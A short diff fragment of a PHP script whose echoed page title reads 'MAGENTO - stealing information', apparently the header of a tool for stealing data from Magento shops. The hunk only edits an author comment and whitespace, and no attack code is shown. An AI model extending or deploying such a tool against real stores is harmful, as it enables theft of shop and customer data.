@@ -1,10 +1,8 @@
 <?php
 /*
-coder : sohai
+sohai
 */
-
 @set_time_limit(0);
-
 echo'<head>
 <title>MAGENTO - stealing information</title>
 </head>
